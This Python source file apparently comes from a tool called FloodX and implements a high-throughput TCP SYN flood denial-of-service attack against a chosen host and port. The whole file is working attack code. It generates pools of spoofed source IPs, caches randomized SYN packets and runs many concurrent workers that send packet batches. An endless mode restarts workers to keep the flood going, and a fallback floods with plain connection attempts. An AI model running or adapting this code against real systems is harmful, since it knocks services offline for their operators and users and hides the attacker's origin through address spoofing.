"""
FloodX: High-Performance SYN Flood Attack Implementation
TCP SYN packet flooding to exhaust connection tables and system resources.
"""

import asyncio
import random
import socket
import struct
import time
import threading
from concurrent.futures import ThreadPoolExecutor
from typing import Dict, Any, List
from datetime import datetime

try:
    from scapy.all import IP, TCP, send, RandShort
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

from common.logger import logger, stats_logger


class HighPerformanceSynFlooder:
    """High-performance TCP SYN flood attack implementation."""
    
    def __init__(self, config: Dict[str, Any]):
        self.config = config
        self.target = self._extract_hostname(config['target'])
        self.port = config.get('port', 80)
        self.duration = config['duration']
        self.concurrency = config['concurrency']
        
        self.running = False
        self.packets_sent = 0
        self.bytes_sent = 0
        self.error_count = 0
        self.active_workers = 0
        
        # High-performance settings
        # Disable IP spoofing on Windows by default to avoid MAC warnings
        import platform
        self.spoof_enabled = config.get('spoof_ip', False) and platform.system() != 'Windows'
        self.advanced = config.get('advanced', False)
        self.packet_cache = []
        self.spoof_ip_pool = []
        
        # Performance optimization
        self.batch_size = 100  # Send packets in batches
        self.thread_pool = ThreadPoolExecutor(max_workers=min(32, self.concurrency))
        
    def _extract_hostname(self, target: str) -> str:
        """Extract hostname from URL or return as-is."""
        import re
        
        if '://' in target:
            match = re.match(r'https?://([^:/]+)', target)
            if match:
                return match.group(1)
        return target

    async def run(self):
        """Execute high-performance SYN flood attack."""
        if not SCAPY_AVAILABLE:
            logger.error("❌ Scapy not available. Install with: pip install scapy")
            return
            
        logger.info(f"🌊 Starting high-performance SYN flood: {self.concurrency} workers targeting {self.target}:{self.port}")
        
        # Initialize real-time statistics
        stats_logger.update_stats(
            target=f"{self.target}:{self.port}",
            vector="syn",
            status="running"
        )
        stats_logger.start_real_time_logging()
        
        try:
            # Prepare attack for maximum performance
            await self._prepare_high_performance_attack()
            
            self.running = True
            
            # Launch high-concurrency workers
            tasks = []
            for i in range(self.concurrency):
                task = asyncio.create_task(self._high_performance_syn_worker(i))
                tasks.append(task)
            
            # Monitor performance and adjust
            monitor_task = asyncio.create_task(self._performance_monitor())
            tasks.append(monitor_task)
            
            # Run for specified duration or endless if duration is 0
            if self.duration > 0:
                await asyncio.sleep(self.duration)
                self.running = False
            else:
                # Endless mode - run until interrupted
                logger.info("🔄 Running in endless mode - Ctrl+C to stop")
                try:
                    while self.running:
                        # Restart cycle every 60 seconds for continuous operation
                        await asyncio.sleep(60)
                        
                        # Check if workers are still alive and restart if needed
                        if self.active_workers < self.concurrency * 0.5:
                            logger.info("🔄 Restarting workers for continuous operation...")
                            
                            # Cancel existing tasks
                            for task in tasks[:-1]:  # Keep monitor task
                                task.cancel()
                            
                            # Restart workers
                            tasks = []
                            for i in range(self.concurrency):
                                task = asyncio.create_task(self._high_performance_syn_worker(i))
                                tasks.append(task)
                            tasks.append(monitor_task)
                            
                except KeyboardInterrupt:
                    logger.info("🛑 Endless SYN flood stopped by user")
                    self.running = False
            
            # Clean shutdown
            await asyncio.gather(*tasks, return_exceptions=True)
            
        except Exception as e:
            logger.error(f"❌ SYN flood failed: {e}")
            stats_logger.increment_errors()
        finally:
            self.thread_pool.shutdown(wait=False)
            stats_logger.stop_real_time_logging()
            stats_logger.update_stats(status="completed")
            logger.info(f"✅ SYN flood completed: {self.packets_sent} packets sent")
    
    async def _prepare_high_performance_attack(self):
        """Prepare attack components for maximum performance."""
        logger.info("⚙️  Preparing high-performance SYN attack...")
        
        # Generate large spoofed IP pool for performance
        if self.spoof_enabled:
            self.spoof_ip_pool = self._generate_spoofed_ip_pool(5000)
            logger.info(f"🎭 Generated {len(self.spoof_ip_pool)} spoofed IP addresses")
        
        # Pre-generate packet templates for better performance  
        await self._generate_packet_cache()
        logger.info(f"📦 Cached {len(self.packet_cache)} SYN packet templates")
    
    def _generate_spoofed_ip_pool(self, count: int) -> List[str]:
        """Generate large pool of spoofed IP addresses."""
        ips = []
        
        # Generate various IP ranges for better distribution
        for _ in range(count):
            if random.random() < 0.3:  # 30% private IPs
                # Private IP ranges
                ranges = [
                    lambda: f"10.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}",
                    lambda: f"172.{random.randint(16,31)}.{random.randint(1,254)}.{random.randint(1,254)}",
                    lambda: f"192.168.{random.randint(1,254)}.{random.randint(1,254)}"
                ]
                ip = random.choice(ranges)()
            else:  # 70% public IPs (simulated)
                # Generate random public-looking IPs (avoiding reserved)
                while True:
                    a, b, c, d = random.randint(1,223), random.randint(1,254), random.randint(1,254), random.randint(1,254)
                    ip = f"{a}.{b}.{c}.{d}"
                    # Avoid obvious reserved ranges
                    if not ip.startswith(('10.', '172.', '192.168.', '127.', '224.', '240.', '0.')):
                        break
            ips.append(ip)
        
        return ips
    
    async def _generate_packet_cache(self):
        """Generate packet templates for high-performance sending."""
        base_ports = [80, 443, 22, 21, 25, 53, 110, 143, 993, 995]
        
        for _ in range(200):  # Generate 200 packet templates
            try:
                # Choose source IP
                src_ip = random.choice(self.spoof_ip_pool) if self.spoof_enabled and self.spoof_ip_pool else None
                
                # Create TCP SYN packet with random parameters
                src_port = random.randint(1024, 65535)
                seq_num = random.randint(1, 4294967295)
                
                if src_ip:
                    # Create packet with spoofed source IP
                    packet = IP(dst=self.target, src=src_ip, ttl=random.randint(32, 128)) / TCP(
                        sport=src_port,
                        dport=self.port,
                        flags="S",
                        seq=seq_num,
                        window=random.randint(1024, 65535)
                    )
                else:
                    # Create packet with system's IP (no spoofing)
                    packet = IP(dst=self.target, ttl=random.randint(32, 128)) / TCP(
                        sport=src_port,
                        dport=self.port,
                        flags="S",
                        seq=seq_num,
                        window=random.randint(1024, 65535)
                    )
                
                self.packet_cache.append(packet)
                
            except Exception as e:
                logger.debug(f"Failed to create packet template: {e}")
    
    async def _high_performance_syn_worker(self, worker_id: int):
        """High-performance worker that sends SYN packets in batches."""
        packets_this_worker = 0
        batch_packets = []
        
        # Update active worker count safely
        self.active_workers += 1
        stats_logger.set_active_threads(self.active_workers)
        
        try:
            while self.running:
                try:
                    # Build batch of packets
                    for _ in range(self.batch_size):
                        if not self.running:
                            break
                            
                        # Get packet from cache or create new
                        if self.packet_cache:
                            packet = random.choice(self.packet_cache)
                            # Randomize some fields for each send
                            packet[IP].id = random.randint(1, 65535)
                            packet[TCP].seq = random.randint(1, 4294967295)
                        else:
                            packet = self._create_syn_packet()
                        
                        if packet:
                            batch_packets.append(packet)
                    
                    # Send batch asynchronously
                    if batch_packets:
                        await asyncio.get_event_loop().run_in_executor(
                            self.thread_pool,
                            self._send_packet_batch,
                            batch_packets.copy()
                        )
                        
                        # Update statistics
                        packets_sent = len(batch_packets)
                        bytes_sent = packets_sent * 40  # Approximate SYN packet size
                        
                        self.packets_sent += packets_sent
                        packets_this_worker += packets_sent
                        self.bytes_sent += bytes_sent
                        stats_logger.increment_packets(packets_sent, bytes_sent)
                        
                        batch_packets.clear()
                    
                    # Dynamic rate adjustment based on performance
                    if self.advanced:
                        # Adaptive delay based on system load
                        delay = max(0.001, 0.01 - (packets_this_worker / 10000))
                        await asyncio.sleep(delay)
                    else:
                        await asyncio.sleep(0.01)  # Basic rate limiting
                        
                except Exception as e:
                    self.error_count += 1
                    stats_logger.increment_errors()
                    await asyncio.sleep(0.1)
                    
        except asyncio.CancelledError:
            pass
        finally:
            # Safely decrement active worker count
            self.active_workers = max(0, self.active_workers - 1)
            stats_logger.set_active_threads(self.active_workers)
            logger.debug(f"Worker {worker_id} sent {packets_this_worker} packets")
    
    def _send_packet_batch(self, packets: List):
        """Send a batch of packets efficiently."""
        successful_sends = 0
        
        # Try Scapy first for raw packets
        if SCAPY_AVAILABLE and len(packets) > 0:
            try:
                # For Windows without admin, disable IP spoofing to avoid MAC warnings
                non_spoofed_packets = []
                for packet in packets:
                    if hasattr(packet[IP], 'src') and packet[IP].src != self.target:
                        # Skip spoofed packets on Windows to avoid MAC warnings
                        continue
                    non_spoofed_packets.append(packet)
                
                if non_spoofed_packets:
                    for packet in non_spoofed_packets:
                        send(packet, verbose=0, iface=None)
                        successful_sends += 1
                else:
                    # Fall back to socket approach if all packets were spoofed
                    successful_sends = self._socket_fallback_batch(packets)
                    
            except Exception as e:
                logger.debug(f"Scapy batch send failed: {e}, using socket fallback")
                successful_sends = self._socket_fallback_batch(packets)
        else:
            # Use socket fallback
            successful_sends = self._socket_fallback_batch(packets)
        
        return successful_sends
    
    def _socket_fallback_batch(self, packets: List):
        """Fallback socket-based approach when Scapy fails."""
        import socket
        successful_packets = 0
        
        for _ in packets:
            try:
                # Create TCP socket and attempt connection
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.05)  # Very short timeout
                try:
                    sock.connect((self.target, self.port))
                    sock.close()
                except:
                    pass  # Connection failure is expected for SYN flood
                finally:
                    sock.close()
                successful_packets += 1
            except Exception:
                continue
        
        return successful_packets
    
    def _create_syn_packet(self):
        """Create a single SYN packet."""
        try:
            src_ip = random.choice(self.spoof_ip_pool) if self.spoof_enabled and self.spoof_ip_pool else None
            
            if src_ip:
                packet = IP(dst=self.target, src=src_ip) / TCP(
                    sport=RandShort(),
                    dport=self.port,
                    flags="S"
                )
            else:
                packet = IP(dst=self.target) / TCP(
                    sport=RandShort(),
                    dport=self.port,
                    flags="S"
                )
            
            return packet
        except Exception:
            return None
    
    async def _performance_monitor(self):
        """Monitor attack performance and adjust parameters."""
        last_packet_count = 0
        last_time = time.time()
        
        while self.running:
            await asyncio.sleep(5)  # Check every 5 seconds
            
            current_time = time.time()
            current_packets = self.packets_sent
            
            # Calculate current rate
            time_diff = current_time - last_time
            packet_diff = current_packets - last_packet_count
            
            if time_diff > 0:
                current_rate = packet_diff / time_diff
                logger.debug(f"Performance: {current_rate:.1f} pps, {self.active_workers} active workers")
                
                # Adaptive performance tuning
                if current_rate < 100 and self.active_workers < self.concurrency:
                    # Performance is low, could increase batch size
                    self.batch_size = min(200, self.batch_size + 10)
                elif current_rate > 1000:
                    # Very high rate, reduce batch size to prevent overwhelming
                    self.batch_size = max(50, self.batch_size - 10)
            
            last_packet_count = current_packets
            last_time = current_time


# Backward compatibility alias
SynFlooder = HighPerformanceSynFlooder
